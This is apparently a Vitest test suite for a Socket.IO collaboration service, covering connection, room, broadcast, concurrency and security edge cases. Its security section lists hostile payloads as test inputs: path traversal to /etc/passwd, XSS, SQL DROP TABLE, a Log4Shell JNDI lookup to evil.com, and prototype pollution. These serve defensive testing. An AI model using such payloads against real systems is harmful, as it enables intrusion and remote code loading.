import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { Server as SocketIOServer } from 'socket.io';
import { createServer } from 'http';
import { SocketService } from './socketService';

// Mock socket.io
vi.mock('socket.io', () => ({
  Server: vi.fn().mockImplementation(() => ({
    on: vi.fn(),
    emit: vi.fn(),
    to: vi.fn().mockReturnThis(),
    use: vi.fn(),
    engine: {
      on: vi.fn(),
    },
  })),
}));

describe('SocketService Edge Cases', () => {
  let socketService: SocketService;
  let mockIo: any;
  let mockSocket: any;

  beforeEach(() => {
    // Create mock socket
    mockSocket = {
      id: 'test-socket-id',
      handshake: {
        address: '127.0.0.1',
        headers: {
          'user-agent': 'test-agent',
        },
      },
      on: vi.fn(),
      emit: vi.fn(),
      join: vi.fn(),
      leave: vi.fn(),
      disconnect: vi.fn(),
      rooms: new Set(),
      data: {},
    };

    // Create mock io
    mockIo = {
      on: vi.fn(),
      emit: vi.fn(),
      to: vi.fn().mockReturnThis(),
      use: vi.fn(),
      engine: {
        on: vi.fn(),
      },
    };

    (SocketIOServer as any).mockReturnValue(mockIo);

    const httpServer = createServer();
    socketService = new SocketService(httpServer);
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe('Connection Edge Cases', () => {
    it('handles rapid connect/disconnect cycles', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      expect(connectionHandler).toBeDefined();

      // Simulate rapid connections
      for (let i = 0; i < 100; i++) {
        const socket = { ...mockSocket, id: `socket-${i}` };
        connectionHandler(socket);
      }

      // Should handle all connections
      expect(mockSocket.on).toHaveBeenCalled();
    });

    it('handles connection with malformed handshake data', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      const malformedSocket = {
        ...mockSocket,
        handshake: null,
      };

      expect(() => connectionHandler(malformedSocket)).not.toThrow();
    });

    it('handles connection with missing headers', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      const socketWithoutHeaders = {
        ...mockSocket,
        handshake: {
          address: '127.0.0.1',
          headers: {},
        },
      };

      expect(() => connectionHandler(socketWithoutHeaders)).not.toThrow();
    });

    it('handles connection from different IP addresses', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      const ipAddresses = [
        '127.0.0.1',
        '192.168.1.1',
        '10.0.0.1',
        '::1',
        '2001:db8::1',
      ];

      ipAddresses.forEach((ip, index) => {
        const socket = {
          ...mockSocket,
          id: `socket-${index}`,
          handshake: {
            ...mockSocket.handshake,
            address: ip,
          },
        };

        expect(() => connectionHandler(socket)).not.toThrow();
      });
    });
  });

  describe('Room Management Edge Cases', () => {
    it('handles joining non-existent projects', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      const joinProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      expect(joinProjectHandler).toBeDefined();

      // Try to join non-existent project
      joinProjectHandler({
        projectId: 'non-existent-project',
        userName: 'test-user',
      });

      expect(mockSocket.emit).toHaveBeenCalledWith('error', {
        message: 'Project not found',
      });
    });

    it('handles joining project with invalid data', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      const joinProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      // Test various invalid data scenarios
      const invalidData = [
        null,
        undefined,
        {},
        { projectId: null },
        { projectId: '' },
        { projectId: 123 },
        { projectId: 'valid', userName: null },
        { projectId: 'valid', userName: 123 },
      ];

      invalidData.forEach((data) => {
        mockSocket.emit.mockClear();
        joinProjectHandler(data);
        expect(mockSocket.emit).toHaveBeenCalledWith('error', expect.any(Object));
      });
    });

    it('handles leaving project when not in any project', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      const leaveProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'leave-project'
      )?.[1];

      expect(leaveProjectHandler).toBeDefined();

      // Try to leave when not in any project
      leaveProjectHandler();

      // Should handle gracefully
      expect(mockSocket.leave).not.toHaveBeenCalled();
    });

    it('handles multiple users joining same project', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      // Create multiple sockets
      const sockets = Array.from({ length: 10 }, (_, i) => ({
        ...mockSocket,
        id: `socket-${i}`,
        join: vi.fn(),
        emit: vi.fn(),
        on: vi.fn(),
      }));

      // Connect all sockets
      sockets.forEach((socket) => {
        connectionHandler(socket);
      });

      // Have all join the same project
      sockets.forEach((socket) => {
        const joinProjectHandler = socket.on.mock.calls.find(
          (call: any) => call[0] === 'join-project'
        )?.[1];

        joinProjectHandler({
          projectId: 'shared-project',
          userName: `user-${socket.id}`,
        });

        expect(socket.join).toHaveBeenCalledWith('project:shared-project');
      });
    });
  });

  describe('Event Broadcasting Edge Cases', () => {
    it('handles broadcasting to empty rooms', () => {
      socketService.broadcastToProject('empty-project', 'test-event', { data: 'test' });

      expect(mockIo.to).toHaveBeenCalledWith('project:empty-project');
      expect(mockIo.emit).toHaveBeenCalledWith('test-event', { data: 'test' });
    });

    it('handles broadcasting with invalid event data', () => {
      const invalidData = [
        null,
        undefined,
        function() {},
        Symbol('test'),
        new Date(),
        /regex/,
      ];

      invalidData.forEach((data) => {
        expect(() => {
          socketService.broadcastToProject('test-project', 'test-event', data);
        }).not.toThrow();
      });
    });

    it('handles broadcasting with circular references', () => {
      const circularData: any = { name: 'test' };
      circularData.self = circularData;

      expect(() => {
        socketService.broadcastToProject('test-project', 'test-event', circularData);
      }).not.toThrow();
    });

    it('handles broadcasting very large payloads', () => {
      const largeData = {
        items: Array.from({ length: 10000 }, (_, i) => ({
          id: i,
          data: 'x'.repeat(1000),
        })),
      };

      expect(() => {
        socketService.broadcastToProject('test-project', 'test-event', largeData);
      }).not.toThrow();
    });
  });

  describe('Error Handling Edge Cases', () => {
    it('handles socket errors during event handling', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      // Mock socket that throws errors
      const errorSocket = {
        ...mockSocket,
        emit: vi.fn().mockImplementation(() => {
          throw new Error('Socket error');
        }),
      };

      connectionHandler(errorSocket);

      const joinProjectHandler = errorSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      // Should handle socket errors gracefully
      expect(() => {
        joinProjectHandler({
          projectId: 'test-project',
          userName: 'test-user',
        });
      }).not.toThrow();
    });

    it('handles disconnection during event processing', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      const disconnectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'disconnect'
      )?.[1];

      expect(disconnectHandler).toBeDefined();

      // Simulate disconnect during processing
      disconnectHandler('client disconnect');

      expect(mockSocket.leave).toHaveBeenCalled();
    });

    it('handles malformed event data', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      // Get all event handlers
      const eventHandlers = mockSocket.on.mock.calls.reduce((acc: any, call: any) => {
        acc[call[0]] = call[1];
        return acc;
      }, {});

      // Test each handler with malformed data
      Object.keys(eventHandlers).forEach((eventName) => {
        if (eventName !== 'disconnect') {
          const handler = eventHandlers[eventName];
          
          // Test with various malformed data
          const malformedData = [
            'string-instead-of-object',
            123,
            true,
            [],
            null,
            undefined,
          ];

          malformedData.forEach((data) => {
            expect(() => handler(data)).not.toThrow();
          });
        }
      });
    });
  });

  describe('Memory Management Edge Cases', () => {
    it('handles memory leaks from uncleaned event listeners', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      // Create many connections and disconnections
      for (let i = 0; i < 1000; i++) {
        const socket = {
          ...mockSocket,
          id: `socket-${i}`,
          on: vi.fn(),
          emit: vi.fn(),
          join: vi.fn(),
          leave: vi.fn(),
        };

        connectionHandler(socket);

        // Simulate disconnect
        const disconnectHandler = socket.on.mock.calls.find(
          (call: any) => call[0] === 'disconnect'
        )?.[1];

        if (disconnectHandler) {
          disconnectHandler('client disconnect');
        }
      }

      // Should handle many connections without issues
      expect(mockIo.on).toHaveBeenCalled();
    });

    it('handles cleanup of room data on disconnect', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      // Join a project
      const joinProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      joinProjectHandler({
        projectId: 'test-project',
        userName: 'test-user',
      });

      // Disconnect
      const disconnectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'disconnect'
      )?.[1];

      disconnectHandler('client disconnect');

      // Should clean up room membership
      expect(mockSocket.leave).toHaveBeenCalled();
    });
  });

  describe('Concurrency Edge Cases', () => {
    it('handles concurrent join/leave operations', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      const joinProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      const leaveProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'leave-project'
      )?.[1];

      // Simulate rapid join/leave operations
      for (let i = 0; i < 100; i++) {
        joinProjectHandler({
          projectId: `project-${i % 5}`,
          userName: 'test-user',
        });

        leaveProjectHandler();
      }

      expect(mockSocket.join).toHaveBeenCalled();
      expect(mockSocket.leave).toHaveBeenCalled();
    });

    it('handles concurrent broadcasts to same project', () => {
      // Simulate multiple concurrent broadcasts
      const promises = Array.from({ length: 100 }, (_, i) =>
        Promise.resolve().then(() => {
          socketService.broadcastToProject(
            'concurrent-project',
            'concurrent-event',
            { index: i }
          );
        })
      );

      expect(() => Promise.all(promises)).not.toThrow();
    });
  });

  describe('Network Edge Cases', () => {
    it('handles slow network conditions', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      // Mock slow socket
      const slowSocket = {
        ...mockSocket,
        emit: vi.fn().mockImplementation(() => {
          // Simulate network delay
          return new Promise((resolve) => setTimeout(resolve, 100));
        }),
      };

      connectionHandler(slowSocket);

      const joinProjectHandler = slowSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      // Should handle slow responses
      expect(() => {
        joinProjectHandler({
          projectId: 'slow-project',
          userName: 'test-user',
        });
      }).not.toThrow();
    });

    it('handles network timeouts', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      // Mock socket that times out
      const timeoutSocket = {
        ...mockSocket,
        emit: vi.fn().mockImplementation(() => {
          throw new Error('ETIMEDOUT');
        }),
      };

      connectionHandler(timeoutSocket);

      const joinProjectHandler = timeoutSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      // Should handle timeouts gracefully
      expect(() => {
        joinProjectHandler({
          projectId: 'timeout-project',
          userName: 'test-user',
        });
      }).not.toThrow();
    });
  });

  describe('Security Edge Cases', () => {
    it('handles potential DoS attacks through rapid connections', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      // Simulate rapid connections from same IP
      for (let i = 0; i < 1000; i++) {
        const socket = {
          ...mockSocket,
          id: `dos-socket-${i}`,
          handshake: {
            address: '192.168.1.100', // Same IP
            headers: {
              'user-agent': 'dos-agent',
            },
          },
        };

        connectionHandler(socket);
      }

      // Should handle without crashing
      expect(mockIo.on).toHaveBeenCalled();
    });

    it('handles malicious event payloads', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      const joinProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      // Test with malicious payloads
      const maliciousPayloads = [
        { projectId: '../../../etc/passwd' },
        { projectId: '<script>alert("xss")</script>' },
        { projectId: 'DROP TABLE projects;' },
        { projectId: '${jndi:ldap://evil.com/a}' },
        { projectId: 'a'.repeat(100000) }, // Very long string
      ];

      maliciousPayloads.forEach((payload) => {
        expect(() => joinProjectHandler(payload)).not.toThrow();
      });
    });

    it('handles prototype pollution attempts', () => {
      const connectionHandler = mockIo.on.mock.calls.find(
        (call: any) => call[0] === 'connection'
      )?.[1];

      connectionHandler(mockSocket);

      const joinProjectHandler = mockSocket.on.mock.calls.find(
        (call: any) => call[0] === 'join-project'
      )?.[1];

      // Attempt prototype pollution
      const pollutionPayload = {
        projectId: 'test-project',
        userName: 'test-user',
        '__proto__': { polluted: true },
        'constructor': { prototype: { polluted: true } },
      };

      joinProjectHandler(pollutionPayload);

      // Should not pollute prototype
      expect(Object.prototype.polluted).toBeUndefined();
    });
  });
});